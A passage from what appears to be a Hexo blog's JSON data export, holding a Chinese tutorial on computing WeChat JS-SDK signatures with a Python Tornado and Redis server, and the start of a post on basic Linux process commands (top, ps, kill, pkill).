ks:\n        stringA += k + \"=\" + str(params[k]) + \"&\"\n    stringSignTemp = stringA[:-1]\n\n    # sha1\n    hash_sha1 = hashlib.sha1(stringSignTemp.encode('utf8'))\n    result_string = {\n        'debug': True,\n        'appId': appId,\n        'timestamp': timestamp,\n        'nonceStr': ran_str,\n        'signature': hash_sha1.hexdigest(),\n        'jsApiList': ['updateAppMessageShareData', 'updateTimelineShareData']\n    }\n    return json.dumps(result_string)\n\n\nclass getResult(RequestHandler):\n    def get(self):\n        url = self.get_argument('url')\n        self.write(getSignature(url))\n\n\nif __name__ == \"__main__\":\n\n    app = Application([(r\"/getApi\", getResult)])\n\n    port = 8060\n\n    app.listen(port)\n\n    print(\"\\n\\n=============================================================\")\n    print(\" (♥◠‿◠)ﾉﾞ server run success at: http://0.0.0.0:%s ლ(´ڡ`ლ)ﾞ\" % str(port))\n    print(\"=============================================================\\n\\n\")\n\n    IOLoop.current().start()\n\n```\n\n* 在请求微信服务器时传自定义参数可以实现更多功能，详见[官方文档](https://developers.weixin.qq.com/doc/offiaccount/OA_Web_Apps/JS-SDK.html)\n\n","source":"_posts/newpost-16.md","raw":"---\ntitle: python实现微信jsapi签名\ndate: 2021-06-24 16:12:39\ntags: [编程,Python]\n---\n\n* 以下完整演示了获取access_token，获取ticket，最后签名返回前端全过程。\n\n<!--more-->\n\n* requirements.txt\n\n```\nrequests==2.23.0\nredis==3.5.3\ntornado==6.0.4\n```\n\n* 安装依赖\n\n```shell\npip install -r requirements.txt\n```\n\n* 调用，其中xxx改成当前前端页面地址，不要url编码\n\n```\nhttp://localhost:8060/getApi?url=xxx\n```\n\n* 程序，注意，程序没有对可能的错误做处理（因为几乎不会出错，如果出错，九成是因为ip白名单没有配置）\n\n```python\nimport redis\nimport requests\nimport json\nimport hashlib\nimport time\nimport random\nimport string\n\nfrom tornado.web import Application, RequestHandler\nfrom tornado.ioloop import IOLoop\n\n# 公众号id与秘钥\nappId = 'xxx'\nappSecret = 'xxx'\n\n# 缓存的access_token与ticket在redis中的key\nack = 'test_access_token'\ntik = 'test_ticket'\n\n# redis主机和密码\nredisHost = 'xxx'\nredisPassword = 'xxx'\n\nr = redis.Redis(host=redisHost, port=6379, password=redisPassword, decode_responses=True)\n\n\ndef getTicket():\n    if r.get(tik) is None:\n        if r.get(ack) is None:\n            params_ack = {'grant_type': 'client_credential', 'appid': appId, 'secret': appSecret}\n            access_token_data = requests.get('https://api.weixin.qq.com/cgi-bin/token', params=params_ack).text\n            access_token = json.loads(access_token_data)['access_token']\n            r.set(ack, access_token, ex=7100)\n        else:\n            access_token = r.get(ack)\n        params_tik = {'access_token': access_token, 'type': 'jsapi'}\n        ticket_data = requests.get('https://api.weixin.qq.com/cgi-bin/ticket/getticket', params_tik).text\n        ticket = json.loads(ticket_data)['ticket']\n        r.set(tik, ticket, ex=7100)\n    else:\n        ticket = r.get(tik)\n    return ticket\n\n\ndef getSignature(url):\n    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))\n    timestamp = int(time.time())\n    params = {'noncestr': ran_str, 'jsapi_ticket': getTicket(), 'timestamp': timestamp, 'url': url}\n    stringA = ''\n    # 参数排序与拼接\n    ks = sorted(params.keys())\n    for k in ks:\n        stringA += k + \"=\" + str(params[k]) + \"&\"\n    stringSignTemp = stringA[:-1]\n\n    # sha1\n    hash_sha1 = hashlib.sha1(stringSignTemp.encode('utf8'))\n    result_string = {\n        'debug': True,\n        'appId': appId,\n        'timestamp': timestamp,\n        'nonceStr': ran_str,\n        'signature': hash_sha1.hexdigest(),\n        'jsApiList': ['updateAppMessageShareData', 'updateTimelineShareData']\n    }\n    return json.dumps(result_string)\n\n\nclass getResult(RequestHandler):\n    def get(self):\n        url = self.get_argument('url')\n        self.write(getSignature(url))\n\n\nif __name__ == \"__main__\":\n\n    app = Application([(r\"/getApi\", getResult)])\n\n    port = 8060\n\n    app.listen(port)\n\n    print(\"\\n\\n=============================================================\")\n    print(\" (♥◠‿◠)ﾉﾞ server run success at: http://0.0.0.0:%s ლ(´ڡ`ლ)ﾞ\" % str(port))\n    print(\"=============================================================\\n\\n\")\n\n    IOLoop.current().start()\n\n```\n\n* 在请求微信服务器时传自定义参数可以实现更多功能，详见[官方文档](https://developers.weixin.qq.com/doc/offiaccount/OA_Web_Apps/JS-SDK.html)\n\n","slug":"newpost-16","published":1,"updated":"2021-06-24T08:26:23.324Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rcu000bq0szycdl1p85","content":"<ul>\n<li>以下完整演示了获取access_token，获取ticket，最后签名返回前端全过程。</li>\n</ul>\n<a id=\"more\"></a>\n<ul>\n<li>requirements.txt</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">requests==2.23.0</span><br><span class=\"line\">redis==3.5.3</span><br><span class=\"line\">tornado==6.0.4</span><br></pre></td></tr></table></figure>\n<ul>\n<li>安装依赖</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>\n<ul>\n<li>调用，其中xxx改成当前前端页面地址，不要url编码</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:8060/getApi?url=xxx</span><br></pre></td></tr></table></figure>\n<ul>\n<li>程序，注意，程序没有对可能的错误做处理（因为几乎不会出错，如果出错，九成是因为ip白名单没有配置）</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> redis</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> tornado.web <span class=\"keyword\">import</span> Application, RequestHandler</span><br><span class=\"line\"><span class=\"keyword\">from</span> tornado.ioloop <span class=\"keyword\">import</span> IOLoop</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 公众号id与秘钥</span></span><br><span class=\"line\">appId = <span class=\"string\">'xxx'</span></span><br><span class=\"line\">appSecret = <span class=\"string\">'xxx'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 缓存的access_token与ticket在redis中的key</span></span><br><span class=\"line\">ack = <span class=\"string\">'test_access_token'</span></span><br><span class=\"line\">tik = <span class=\"string\">'test_ticket'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># redis主机和密码</span></span><br><span class=\"line\">redisHost = <span class=\"string\">'xxx'</span></span><br><span class=\"line\">redisPassword = <span class=\"string\">'xxx'</span></span><br><span class=\"line\"></span><br><span class=\"line\">r = redis.Redis(host=redisHost, port=<span class=\"number\">6379</span>, password=redisPassword, decode_responses=<span class=\"keyword\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getTicket</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> r.get(tik) <span class=\"keyword\">is</span> <span class=\"keyword\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> r.get(ack) <span class=\"keyword\">is</span> <span class=\"keyword\">None</span>:</span><br><span class=\"line\">            params_ack = &#123;<span class=\"string\">'grant_type'</span>: <span class=\"string\">'client_credential'</span>, <span class=\"string\">'appid'</span>: appId, <span class=\"string\">'secret'</span>: appSecret&#125;</span><br><span class=\"line\">            access_token_data = requests.get(<span class=\"string\">'https://api.weixin.qq.com/cgi-bin/token'</span>, params=params_ack).text</span><br><span class=\"line\">            access_token = json.loads(access_token_data)[<span class=\"string\">'access_token'</span>]</span><br><span class=\"line\">            r.set(ack, access_token, ex=<span class=\"number\">7100</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            access_token = r.get(ack)</span><br><span class=\"line\">        params_tik = &#123;<span class=\"string\">'access_token'</span>: access_token, <span class=\"string\">'type'</span>: <span class=\"string\">'jsapi'</span>&#125;</span><br><span class=\"line\">        ticket_data = requests.get(<span class=\"string\">'https://api.weixin.qq.com/cgi-bin/ticket/getticket'</span>, params_tik).text</span><br><span class=\"line\">        ticket = json.loads(ticket_data)[<span class=\"string\">'ticket'</span>]</span><br><span class=\"line\">        r.set(tik, ticket, ex=<span class=\"number\">7100</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        ticket = r.get(tik)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ticket</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSignature</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    ran_str = <span class=\"string\">''</span>.join(random.sample(string.ascii_letters + string.digits, <span class=\"number\">8</span>))</span><br><span class=\"line\">    timestamp = int(time.time())</span><br><span class=\"line\">    params = &#123;<span class=\"string\">'noncestr'</span>: ran_str, <span class=\"string\">'jsapi_ticket'</span>: getTicket(), <span class=\"string\">'timestamp'</span>: timestamp, <span class=\"string\">'url'</span>: url&#125;</span><br><span class=\"line\">    stringA = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"comment\"># 参数排序与拼接</span></span><br><span class=\"line\">    ks = sorted(params.keys())</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> ks:</span><br><span class=\"line\">        stringA += k + <span class=\"string\">\"=\"</span> + str(params[k]) + <span class=\"string\">\"&amp;\"</span></span><br><span class=\"line\">    stringSignTemp = stringA[:<span class=\"number\">-1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># sha1</span></span><br><span class=\"line\">    hash_sha1 = hashlib.sha1(stringSignTemp.encode(<span class=\"string\">'utf8'</span>))</span><br><span class=\"line\">    result_string = &#123;</span><br><span class=\"line\">        <span class=\"string\">'debug'</span>: <span class=\"keyword\">True</span>,</span><br><span class=\"line\">        <span class=\"string\">'appId'</span>: appId,</span><br><span class=\"line\">        <span class=\"string\">'timestamp'</span>: timestamp,</span><br><span class=\"line\">        <span class=\"string\">'nonceStr'</span>: ran_str,</span><br><span class=\"line\">        <span class=\"string\">'signature'</span>: hash_sha1.hexdigest(),</span><br><span class=\"line\">        <span class=\"string\">'jsApiList'</span>: [<span class=\"string\">'updateAppMessageShareData'</span>, <span class=\"string\">'updateTimelineShareData'</span>]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(result_string)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">getResult</span><span class=\"params\">(RequestHandler)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        url = self.get_argument(<span class=\"string\">'url'</span>)</span><br><span class=\"line\">        self.write(getSignature(url))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    app = Application([(<span class=\"string\">r\"/getApi\"</span>, getResult)])</span><br><span class=\"line\"></span><br><span class=\"line\">    port = <span class=\"number\">8060</span></span><br><span class=\"line\"></span><br><span class=\"line\">    app.listen(port)</span><br><span class=\"line\"></span><br><span class=\"line\">    print(<span class=\"string\">\"\\n\\n=============================================================\"</span>)</span><br><span class=\"line\">    print(<span class=\"string\">\" (♥◠‿◠)ﾉﾞ server run success at: http://0.0.0.0:%s ლ(´ڡ`ლ)ﾞ\"</span> % str(port))</span><br><span class=\"line\">    print(<span class=\"string\">\"=============================================================\\n\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    IOLoop.current().start()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在请求微信服务器时传自定义参数可以实现更多功能，详见<a href=\"https://developers.weixin.qq.com/doc/offiaccount/OA_Web_Apps/JS-SDK.html\" target=\"_blank\" rel=\"noopener\">官方文档</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<ul>\n<li>以下完整演示了获取access_token，获取ticket，最后签名返回前端全过程。</li>\n</ul>","more":"<ul>\n<li>requirements.txt</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">requests==2.23.0</span><br><span class=\"line\">redis==3.5.3</span><br><span class=\"line\">tornado==6.0.4</span><br></pre></td></tr></table></figure>\n<ul>\n<li>安装依赖</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>\n<ul>\n<li>调用，其中xxx改成当前前端页面地址，不要url编码</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:8060/getApi?url=xxx</span><br></pre></td></tr></table></figure>\n<ul>\n<li>程序，注意，程序没有对可能的错误做处理（因为几乎不会出错，如果出错，九成是因为ip白名单没有配置）</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> redis</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> tornado.web <span class=\"keyword\">import</span> Application, RequestHandler</span><br><span class=\"line\"><span class=\"keyword\">from</span> tornado.ioloop <span class=\"keyword\">import</span> IOLoop</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 公众号id与秘钥</span></span><br><span class=\"line\">appId = <span class=\"string\">'xxx'</span></span><br><span class=\"line\">appSecret = <span class=\"string\">'xxx'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 缓存的access_token与ticket在redis中的key</span></span><br><span class=\"line\">ack = <span class=\"string\">'test_access_token'</span></span><br><span class=\"line\">tik = <span class=\"string\">'test_ticket'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># redis主机和密码</span></span><br><span class=\"line\">redisHost = <span class=\"string\">'xxx'</span></span><br><span class=\"line\">redisPassword = <span class=\"string\">'xxx'</span></span><br><span class=\"line\"></span><br><span class=\"line\">r = redis.Redis(host=redisHost, port=<span class=\"number\">6379</span>, password=redisPassword, decode_responses=<span class=\"keyword\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getTicket</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> r.get(tik) <span class=\"keyword\">is</span> <span class=\"keyword\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> r.get(ack) <span class=\"keyword\">is</span> <span class=\"keyword\">None</span>:</span><br><span class=\"line\">            params_ack = &#123;<span class=\"string\">'grant_type'</span>: <span class=\"string\">'client_credential'</span>, <span class=\"string\">'appid'</span>: appId, <span class=\"string\">'secret'</span>: appSecret&#125;</span><br><span class=\"line\">            access_token_data = requests.get(<span class=\"string\">'https://api.weixin.qq.com/cgi-bin/token'</span>, params=params_ack).text</span><br><span class=\"line\">            access_token = json.loads(access_token_data)[<span class=\"string\">'access_token'</span>]</span><br><span class=\"line\">            r.set(ack, access_token, ex=<span class=\"number\">7100</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            access_token = r.get(ack)</span><br><span class=\"line\">        params_tik = &#123;<span class=\"string\">'access_token'</span>: access_token, <span class=\"string\">'type'</span>: <span class=\"string\">'jsapi'</span>&#125;</span><br><span class=\"line\">        ticket_data = requests.get(<span class=\"string\">'https://api.weixin.qq.com/cgi-bin/ticket/getticket'</span>, params_tik).text</span><br><span class=\"line\">        ticket = json.loads(ticket_data)[<span class=\"string\">'ticket'</span>]</span><br><span class=\"line\">        r.set(tik, ticket, ex=<span class=\"number\">7100</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        ticket = r.get(tik)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ticket</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSignature</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    ran_str = <span class=\"string\">''</span>.join(random.sample(string.ascii_letters + string.digits, <span class=\"number\">8</span>))</span><br><span class=\"line\">    timestamp = int(time.time())</span><br><span class=\"line\">    params = &#123;<span class=\"string\">'noncestr'</span>: ran_str, <span class=\"string\">'jsapi_ticket'</span>: getTicket(), <span class=\"string\">'timestamp'</span>: timestamp, <span class=\"string\">'url'</span>: url&#125;</span><br><span class=\"line\">    stringA = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"comment\"># 参数排序与拼接</span></span><br><span class=\"line\">    ks = sorted(params.keys())</span><br><span class=\"line\">    <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> ks:</span><br><span class=\"line\">        stringA += k + <span class=\"string\">\"=\"</span> + str(params[k]) + <span class=\"string\">\"&amp;\"</span></span><br><span class=\"line\">    stringSignTemp = stringA[:<span class=\"number\">-1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># sha1</span></span><br><span class=\"line\">    hash_sha1 = hashlib.sha1(stringSignTemp.encode(<span class=\"string\">'utf8'</span>))</span><br><span class=\"line\">    result_string = &#123;</span><br><span class=\"line\">        <span class=\"string\">'debug'</span>: <span class=\"keyword\">True</span>,</span><br><span class=\"line\">        <span class=\"string\">'appId'</span>: appId,</span><br><span class=\"line\">        <span class=\"string\">'timestamp'</span>: timestamp,</span><br><span class=\"line\">        <span class=\"string\">'nonceStr'</span>: ran_str,</span><br><span class=\"line\">        <span class=\"string\">'signature'</span>: hash_sha1.hexdigest(),</span><br><span class=\"line\">        <span class=\"string\">'jsApiList'</span>: [<span class=\"string\">'updateAppMessageShareData'</span>, <span class=\"string\">'updateTimelineShareData'</span>]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(result_string)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">getResult</span><span class=\"params\">(RequestHandler)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        url = self.get_argument(<span class=\"string\">'url'</span>)</span><br><span class=\"line\">        self.write(getSignature(url))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    app = Application([(<span class=\"string\">r\"/getApi\"</span>, getResult)])</span><br><span class=\"line\"></span><br><span class=\"line\">    port = <span class=\"number\">8060</span></span><br><span class=\"line\"></span><br><span class=\"line\">    app.listen(port)</span><br><span class=\"line\"></span><br><span class=\"line\">    print(<span class=\"string\">\"\\n\\n=============================================================\"</span>)</span><br><span class=\"line\">    print(<span class=\"string\">\" (♥◠‿◠)ﾉﾞ server run success at: http://0.0.0.0:%s ლ(´ڡ`ლ)ﾞ\"</span> % str(port))</span><br><span class=\"line\">    print(<span class=\"string\">\"=============================================================\\n\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    IOLoop.current().start()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在请求微信服务器时传自定义参数可以实现更多功能，详见<a href=\"https://developers.weixin.qq.com/doc/offiaccount/OA_Web_Apps/JS-SDK.html\" target=\"_blank\" rel=\"noopener\">官方文档</a></li>\n</ul>"},{"title":"常用的Linux进程基本命令","date":"2021-07-12T06:44:07.000Z","_content":"\n#### 按内存或cpu占用排序\n\n首先输入`top`命令，然后:\n\n* 按`P`-以 CPU 占用率大小的顺序排列进程列表\n\n* 按`M`-以内存占用率大小的顺序排列进程列表\n\n<!--more-->\n\n| 序号 | 列名    | 含义                                                         |\n| ---- | ------- | ------------------------------------------------------------ |\n| 1    | PID     | 进程id                                                       |\n| 2    | USER    | 进程所有者的用户名                                           |\n| 3    | RP      | 优先级                                                       |\n| 4    | NI      | nice值。负值表示高优先级，正值表示低优先级                   |\n| 5    | VIRT    | 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES                |\n| 6    | RES     | 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA    |\n| 7    | SHR     | 共享内存大小，单位kb                                         |\n| 8    | S       | 进程状态(D=不可中断的睡眠状态,R=运行,S=睡眠,T=跟踪/停止,Z=僵尸进程) |\n| 9    | %CPU    | 上次更新到现在的CPU时间占用百分比                            |\n| 10   | %MEM    | 进程使用的物理内存百分比                                     |\n| 11   | TIME+   | 进程使用的CPU时间总计，单位1/100秒                           |\n| 12   | COMMAND | 命令名/命令行                                                |\n\n* 按`q`退出\n\n### 查询指定名称的进程\n\n使用命令`ps -ef|grep xxxx`，其中`xxxx`替换为你想要查询的进程名，例如`ps -ef|grep python`\n\n| 列号 | 列名    | 含义               |\n| ---- | ------- | ------------------ |\n| 1    | USER    | 进程所有者的用户名 |\n| 2    | PID     | 进程id             |\n| 3    | PPID    | 父进程id           |\n| 4    | C       | 使用的资源百分比   |\n| 5    | STIME   | 系统启动时间       |\n| 6    | TTY     | 登入者的终端机位置 |\n| 7    | COMMAND | 命令名/命令行      |\n\n### 杀死进程\n\n* 根据进程id杀死进程\n  * `kill xxxx`，`xxxx`替换为PID，即进程id，例如`kill 3781`，强制终止可以添加`-9`参数，例如`kill -9 3781`\n* 根据名称杀死进程\n  * `killall xxxx`，`xxxx`替换为进程名称，例如`killall python`\n  * `pkill xxxx`，`xxxx`替换为进程名称，例如`pkill python`\n\n\n\n","source":"_posts/newpost-17.md","raw":"---\ntitle: 常用的Linux进程基本命令\ndate: 2021-07-12 14:44:07\ntags: 运维\n---\n\n#### 按内存或cpu占用排序\n\n首先输入`top`命令，然后:\n\n* 按`P`-以 CPU 占用率大小的顺序排列进程列表\n\n* 按`M`-以内存占用率大小的顺序排列进程列表\n\n<!--more-->\n\n| 序号 | 列名    | 含义                                                         |\n| ---- | ------- | ------------------------------------------------------------ |\n| 1    | PID     | 进程id                                                       |\n| 2    | USER    | 进程所有者的用户名                                           |\n| 3    | RP      | 优先级                                                       |\n| 4    | NI      | nice值。负值表示高优先级，正值表示低优先级                   |\n| 5    | VIRT    | 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES                |\n| 6    | RES     | 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA    |\n| 7    | SHR     | 共享内存大小，单位kb                                         |\n| 8    | S       | 进程状态(D=不可中断的睡眠状态,R=运行,S=睡眠,T=跟踪/停止,Z=僵尸进程) |\n| 9    | %CPU    | 上次更新到现在的CPU时间占用百分比                            |\n| 10   | %MEM    | 进程使用的物理内存百分比                                     |\n| 11   | TIME+   | 进程使用的CPU时间总计，单位1/100秒                           |\n| 12   | COMMAND | 命令名/命令行                                                |\n\n* 按`q`退出\n\n### 查询指定名称的进程\n\n使用命令`ps -ef|grep xxxx`，其中`xxxx`替换为你想要查询的进程名，例如`ps -ef|grep python`\n\n| 列号 | 列名    | 含义               |\n| ---- | ------- | ------------------ |\n| 1    | USER    | 进程所有者的用户名 |\n| 2    | PID     | 进程id             |\n| 3    | PPID    | 父进程id           |\n| 4    | C       | 使用的资源百分比   |\n| 5    | STIME   | 系统启动时间       |\n| 6    | TTY     | 登入者的终端机位置 |\n| 7    | COMMAND | 命令名/命令行      